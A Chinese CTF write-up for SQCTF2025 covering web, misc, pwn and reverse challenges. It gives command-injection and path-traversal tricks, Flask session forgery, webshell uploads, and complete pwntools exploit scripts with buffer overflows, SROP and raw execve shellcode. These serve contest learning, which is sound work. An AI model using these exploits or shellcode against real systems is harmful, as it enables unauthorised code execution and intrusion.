---
title: "SQCTF2025WP"
date: 2025-12-10 08:55:15
categories: "比赛wp"
tags:
  - "比赛wp"
cover: /img/backgrounds/bg-21.png
top_img: /img/backgrounds/bg-21.png
disableNunjucks: true
---

# web部分
### **RceMe**
源码如下

```plain
<?php
$command = $_GET['com'];
if (isset($command) && strlen($command) <= 5) {
    system($command);
} else {
    print("你小子干什么呢？");
}
```

strlen限制传入的参数必须少于5字符，使用ls发现flag在根目录

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413123212529.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-001.png)

**常见输出函数：**

cat函数 由第一行开始显示内容，并将所有内容输出

tac函数 从最后一行倒序显示内容，并将所有内容输出

nl      类似于cat -n，显示时输出行号

more    根据窗口大小，一页一页的现实文件内容

less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符

head    只显示头几行

tail    只显示最后几行

sort    文本内容排列

uniq    可以查看

vim     一种编辑器，这个也可以查看

od      以二进制的方式读取档案内容

vi      一种编辑器，这个也可以查看

strings  在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings

paste	把每个文件以列对列的方式，一列列地加以合并

grep	grep { flag.php打印有”{“的一行

sed		一种编辑器，可以用sed -f flag.php读取flag

这里可以使用nl把根目录的文件显示出来

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413124203837.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-002.png)

### ezGame
直接玩到2048就行

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413125737600.png)

### **伪装**
源码如下

```plain
from flask import Flask, session, request, render_template_string
import flask
import os

app = Flask(__name__)
app.secret_key = 'love'

@app.route('/')
def index():
    session['role'] = {
        'is_admin': 0,
        'name': 'aiyamaya'
    }
    with open(__file__, 'r') as file:
        code = file.read()
    return code

@app.route('/admin')
def admin_handler():
    try:
        role = session.get('role')
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return 'Without you, you are an intruder!'

    if role.get('is_admin') == 1 and role.get('name') == 'sjx':
        flag = os.popen("cat /flag").read()
        message = "Oh, You get me! The flag is: %s" % flag
        return render_template_string(message)
    else:
        return "Error: You don't have the power!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

flask session 伪造，在/路由下'is_admin'=0，name=aiyamaya，当在/admin路由时'is_admin'=1，name=sjx可以读取flag

cookies中可以看到session

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413131204781.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-003.png)

源码中给了key，可以直接进行session伪造

session伪造工具：[https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413143657558.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-004.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413143748186.png)

把session值修改得到flag

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413143842546.png)

### ping
```plain
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    
    if (strpos($ip, ';') !== false) {
        die('Hacker detected!');
    }
    
    system("ping -c 1 " . $ip);
} else {
    
    highlight_file(__FILE__);
}
?>
```

看到ping命令就可以利用截断来执行新的命令。禁用了；，使用|代替

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413144228365.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-005.png)

### Are you from SQNU?
首先使用post绕过第一层

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413144612257.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-006.png)

传参hhh=abc

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413144719845.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-007.png)



添加请求来源

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413144831113.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-008.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413145250639.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-009.png)

改为本地

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413145355502.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-010.png)

添加cookie

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413145454264.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-011.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413145516058.png)

### Through
根据题目联想到路径穿越

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413145715056.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-012.png)

在../可以正常回显，说明../会被替换为空

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413145950899.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-013.png)

构造....//进行绕过

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413150250227.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-014.png)

找到路径后读取flag

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413150412476.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-015.png)

### File_download
![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413150531483.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-016.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413150641189.png)

文件下载漏洞

```plain
 WEB-INF主要包含一下文件或目录：
    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
    /WEB-INF/database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 
```

首先读取初始化配置信息/WEB-INF/web.xml

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413152159101.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-017.png)

下载这个.class文件再利用反编译手段来获得源码

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413152734988.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-018.png)

得到源码，给ai解一下

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413152934275.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-019.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413153420694.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-020.png)



### 商师一日游
![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413153536184.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-021.png)

查看源码得到第一段

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413153703648.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-022.png)

构造cookie

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413154007318.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-023.png)

抓包发现另一个文件

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413154203421.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-024.png)

打开robots.txt

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413154240417.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-025.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413154315130.png)

%0绕过

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413155301526.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-026.png)

无法点击，查看源码，直接进行post传参

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413155549210.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-027.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413155630543.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-028.png)

查看最后一段

![](/assets/docs/比赛wp/SQCTF2025WP/img-029.png)![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413155928729.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413155955115.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-030.png)

### 小小查询系统
![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413160230808.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-031.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413160211669.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-032.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413160550195.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-033.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413160614975.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413160713922.png)

### 图片展示功能
上传发现没过滤.htaccess文件

.htaccess文件(或者"分布式配置文件"）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。  
通过.htaccess，把目录下的文件都当中php文件解析

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413201645509.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-034.png)



原文链接：[https://blog.csdn.net/weixin_44032232/article/details/108998564](https://blog.csdn.net/weixin_44032232/article/details/108998564)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413161009243.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-035.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413161419715.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-036.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413161439707.png)

### Input a number
intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。

### ![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413162624056.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-037.png)
### Ez_calculate
拿之前比赛的脚本改一下，或者ai写一个脚本，跑完回显/flag

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413162926902.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-038.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413163005793.png)

### My Blog
进行博客发现用户名和密码

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413163156910.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-039.png)

使用7kbscan或者dirsearch扫目录，发现robots

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413163349952.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-040.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413163340981.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-041.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413163608682.png)

### 唯一
找不到一点东西，arjun扫一下

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413164027305.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-042.png)

尝试ssti，用fenjing梭了

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413164502748.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-043.png)

### 白月光
也是ssti,查看源码注入点是name，fenjing梭哈

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413164946914.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-044.png)

### Upload_Level1
上传图片马，抓包修改文件名后缀为1.php

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165142764.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-045.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165218448.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-046.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165236921.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-047.png)

### Upload_Level2
解法和之前一样，上传图片马，抓包修改文件名后缀为1.php

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165423962.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-048.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165458978.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-049.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165518589.png)

### eeaassyy
禁用f12等一堆东西，直接用view-source:查看源码

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165622195.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-050.png)

### ggoodd
post传id=abc,get传参的值会进行json解码，传入json编码的x=cba即可

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413165912620.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-051.png)

### 之后的web题没来的及复现，我只能随便写一下了
### 无参之舞
无参rce

参考

[[https://blog.csdn.net/2301_76690905/article/details/133808536]](https://blog.csdn.net/2301_76690905/article/details/133808536]): 

源码给了用户名sqctf,使用bp爆破出密码为1q2w3e4r

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413204024519.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-052.png)

没禁用scandir,使用scandir查看当前目录所有文件名，scandir本身无回显，用print_r把结果打印，可以看到flag.php

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413204321370.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-053.png)

再利用readfile()和array_rand()读取flag

### 开发人员的小失误
扫目录发现备份文件，得到flag

### 逃
来不及复现，不记得了

### 嘤嘤嘤
来不及复现，不记得了

### baby include
来不及复现，不记得了

### baby rce
来不及复现，不记得了

# misc部分
### YuanShen_Start!
Audacity打开音频，是个假flag,但是可以用来解压里面zip文件

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413175612051.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-054.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413175556260.png)

解压后是个word文档，里面的flag也是假的，把word后缀改为zip，有个img.zip，进行爆破，解出来依旧没有flag

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413180336517.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-055.png)

在word文件夹里的media里面发现一张图片，拿去随波逐流看一下，得到flag

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413180531285.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-056.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413180619613.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-057.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413180643147.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-058.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413180722444.png)

### piet
搜索找到解析该图片的工具

参考文献

[[https://blog.csdn.net/MarkRao/article/details/121796707]](https://blog.csdn.net/MarkRao/article/details/121796707]): 

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413211005996.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-059.png)

![](/assets/docs/比赛wp/SQCTF2025WP/img-060.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413183910679.png)

### ez_music1
Audacity打开，显示多视图，波形，频谱图

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184231963.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-061.png)

### love.host
010发现图片中含有zip文件，使用foremost提取文件

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184637974.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-062.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184559970.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-063.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184527733.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184556945.png)

### 小巷人家
百度识图发现是西园寺

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184756751.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-064.png)

### 王者荣耀真是太好玩了
搜索第一个玩家的id，可以看到头像是一个地方

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413184932014.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-065.png)

用百度地图搜索，发现一个诡异的评论，进行url编码得到flag

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413185117146.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-066.png)

![](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250413185015054.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-067.png)

### Welcome_Sign_in
公众号签到



# PWN部分
### 浅红欺醉粉，肯信有江梅
nc + 比赛链接，直接拿flag

### 领取你的小猫娘
![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413114456519.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-068.png)

gets填充数据到v5，覆盖为1绕过判断

exp:

```plain
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#r = remote('node.vnteam.cn',47042)

r = process('./cat')

payload = b'a' * 76 + b'1'
r.sendline(payload)
r.interactive()
```

### 江南无所有，聊赠一枝春
checksec一下发现只开了nx保护，ida里查看可以正常溢出返回地址覆盖为gift函数即可

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413114710642.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-069.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413114832928.png)

exp:

```plain
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
r = remote('challenge.qsnctf.com', 32150)

#r = process('./c')

payload = b'a' * 72 + p64(0x4011BB)
r.sendline(payload)
r.interactive()
```

### 萧萧黄叶闭疏窗
checksec一下发现保护全关，放进ida分析一下，逻辑很简单，进payload变量查看，发现在bss段上，由于没开保护，可以想到是写入shellcode。memcpy函数是将payload的内容复制给dest，如果payload比dest变量长，则会导致栈溢出，所以可以将先写入shellcode，然后补齐到dest距离rbp的距离，最后将返回地址写为payload去执行shellcode

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413130742933.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-070.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413130754856.png)

exp:

```plain
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#r = remote('challenge.qsnctf.com', 30877)

r = process('./bad')

#payload =(b'a' * 0x48 + p64(0x4040A0) + asm(shellcraft.sh())).ljust(0x80, b'\x00')
payload = asm(shellcraft.sh()).ljust(0x48, b'\x00') + p64(0x4040A0)
r.sendlineafter(b'do ?', payload)
r.interactive()
```





### 当时只道是寻常
查看保护发现一个都没开，而且是动态链接，进ida分析发现用syscall调用函数，且存在bin_sh字符串，可以尝试用SROP,由于没有直接调用sigreturn的gadget,所以要构造rop，用ROPgadget找可用的gadget,然后构造ROP即可，用pwntools的工具内部构造栈结构

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413122026949.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-071.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413122107992.png)

exp:

```plain
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

elf = ELF('./pwn01')
r= process('./pwn01')
bin_sh = 0x40203A
rax = 0x40104a
ret =0x401048
syscall=0x401031

sigreframe = SigreturnFrame()
sigreframe.rax=59
sigreframe.rdi=bin_sh
sigreframe.rsi=0x0
sigreframe.rdx=0x0
sigreframe.rip=syscall
payload = b'a'*8 + p64(rax)+ p64(0xf)+p64(syscall)+ bytes(sigreframe) # 先溢出到返回地址，在构造

#gdb.attach(r,'b *x40110A')
r.sendafter(b'extraordinary.', payload)
r.interactive()
```

### 赌书消得泼茶香
检查一下发现可以正常溢出

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413133206546.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-072.png)

ida中查看主程序，发现scanf函数输入，然后经过sub_401320函数后将结果复制到dest，盲猜是一个简单加密或者解密过程，由于下面直接将输出进行复制，所以应该是一个解密过程

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413132633947.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-073.png)

跟进一下函数看一下大概逻辑，对齐4四字节，判断，申请存放空间，发现有个401260函数，跟进一下

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413132757650.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-074.png)

发现一堆赋值和对值进行移位操作，可以在跟进一下401216函数，一眼base64码表，基本可以判断是一个base64解密，所以正常构造payload，将payload进行一个base加密即可，memcpy函数可能导致溢出，前面有提到，这里就不提了

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413132811924.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-075.png)

![](/assets/docs/比赛wp/SQCTF2025WP/img-076.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413132830476.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413134226882.png)

发现有shell函数，可以直接利用

exp：

```plain
from pwn import *
import base64
context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./pwn0')
r = remote("challenge.qsnctf.com", 31483)
#r = process('./pwn0')
ret = 0x040101a
payload = b'a' * 0x68 + p64(ret) +p64(0x40141D)

en_payload = base64.b64encode(payload).decode('utf-8')
r.sendlineafter(b'now?', en_payload)
r.interactive()
```



### 我觉君非池中物，咫尺蛟龙云雨
发现保护全开，进入ida进行分析

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413131704520.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-077.png)

 程序用mprotect函数将stdout权限设置为最高等级，且read的buff地址在bss段，依旧优先考虑shellcode。这题应该 是打了一个非预期解，找了一段较短 的shellcode就打通了实际应该没这么简单

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413131604613.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-078.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413131856336.png)

```plain
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#p = remote('challenge.qsnctf.com', 30441)

p = process('./pwn99')
context.arch='amd64'
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

p.sendafter(b'window.', shellcode)


p.interactive()
```



### 借的东风破金锁
虽然这题保护全开，实际签到题，进入ida发现只需要验证一下，双击auth_code可以看到密码，输进去就行

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413132417552.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-079.png)

![](/assets/docs/比赛wp/SQCTF2025WP/img-080.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413132645293.png)

```plain
from pwn import *
context(arch='amd64', os='linux', log_level ='debug')
elf = ELF('./key')
#libc = ELF('./libc.so.6')
#p = remote('node5.anna.nssctf.cn', 24648)
r = process('./key')

payload = p64(0x53514E55435446)
r.sendline(payload)
r.interactive()
```

# Reserve部分
先叠个甲，主pwn副re,必定少不了deepseek一把手。复杂逻辑就扔给让分析了，能问出来也是一种能力

PS:**哪一道题记着有UPX壳来着，原件已经脱壳了，忘了具体是哪一个，有壳就用工具脱壳**`upx -d 文件目录`**来脱壳然后正常放入ida中分析**

### 天下谁人不识君
![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413140517269.png)

则解密逻辑就是先将这个result拆分成s1和s2的值，然后找出s1,s2分别在原始flag中的哪个位置，然后计算s1和s2

最后将字符拼接起来

注意的是：负索引在Python中是从字符串末尾开始计算的

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413141401457.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-081.png)

![](/assets/docs/比赛wp/SQCTF2025WP/img-082.png)

```plain
s = 'wesyvbniazxchjko1973652048@$+-&*<> '  # 确保s的长度为34
result = input("请输入加密后的字符串result：")

flag = ''
for k in range(len(result) // 2):
    i = k  # 对应原代码中的i值
    c1 = result[2 * k]
    c2 = result[2 * k + 1]

    # 找到字符在s中的位置
    pos1 = s.index(c1)
    pos2 = s.index(c2)

    # 计算s1和s2
    s1 = (pos1 - i) % 34
    s2 = (-pos2 - i - 1) % 34

    # 恢复原始字符
    or_char = chr(s1 * 17 + s2)
    flag += or_char

print("原始flag为：", flag)
```

### 遇事不决，可问春风
打开附件可以看到是一个apk文件，apk文件其实是一种变相的zip文件，可以直接进行解压缩，或者直接用工具jadx打开

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413142927789.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-083.png)

打开发现一大堆东西，可以直接搜索MainActivity定位到主函数下，这里可以看到加密逻辑

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413143539865.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-084.png)



对于一般比较简单的题目，只需要找到函数的入口，即MainActivity中onCreate方法下的onClick点击事件，找注册码(flag)，有一个按钮负责判断注册码是否正确，这个按钮的点击事件就是用onClick实现的，所以大部分这种题目直接找onClick

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413144728383.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-085.png)

分析函数逻辑发现是一个验证程序，找到加密逻辑，发现是一个简单的一伙，直接写解密脚本即可

exp：

```plain
encrypted_list = ['5', '#', ')', '7', '5', '#', ')', '7']

# 将密钥转换为ASCII值
B = ord('B')
# 解密函数
def decrypt(encrypted_data, key_ascii):
    data = []
    for i in encrypted_data:
        # 将字符转换为ASCII值
        char_ascii = ord(i)
        # 执行异或操作
        decrypted_char_ascii = char_ascii ^ key_ascii
        # 将结果转换回字符
        decrypted_char = chr(decrypted_char_ascii)
        data.append(decrypted_char)
    return data

# 执行解密
decrypted_result = decrypt(encrypted_list, B)

# 打印解密结果
print("解密后的数据:", decrypted_result)
```

解密完验证一下得到正确flag

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413143815614.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-086.png)

### 春风也有春风愁
解压文件看到文件名基本知道根异或有关，用工具查一下壳，没壳直接扔ida

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413145000314.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-087.png)

发现输入给buffer值然后遍历赋值给v8，接着与A5异或在＋55,最后与v6比较，则v6是密文。解密过程反着来就行

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413145203858.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-088.png)

exp:

```plain
encrypto_data = [0x0D, 0x0B, 0xFD, 0x08, 0xFA, 0x15, 0xF7, 0xFB, 0xFB, 0x0D, 0x13, 0x31, 0x14,0x01, 0x0E, 0x0F]

flag = []
for v7 in encrypto_data:
    # 计算 (v7 - 55) 并确保在 0-255 范围内
    temp = (v7 - 55) % 256
    # 异或 0xA5 并转换为字符
    original_char = chr(temp ^ 0xA5)
    flag.append(original_char)

print("".join(flag))

###sqctf{eaasy_xor}###
```

### ezRe
解压发现是一个exe文件，图标是一个类似与python的图标，可以猜测是pyc文件类的题，先将exe文件分析为pyc文件，接着用工具将原始的py代码提取出来.

先用在线网站将exe文件分析为pyc文件

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413150339786.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-089.png)

接着将pyc文件在反汇编为py文件，读取源代码

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413150440117.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-090.png)

运行即可得到flag内容

### 不劳春风解我忧
第一步查壳，没壳放ida里分析

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413150734051.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-091.png)

分析程序发现是V5作为密钥到xxtea函数里进行加密，然后将加密的数据进行判断，相同则返回true

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413151036317.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-092.png)

扔给deepseek分析一下是正常的xxtea加密

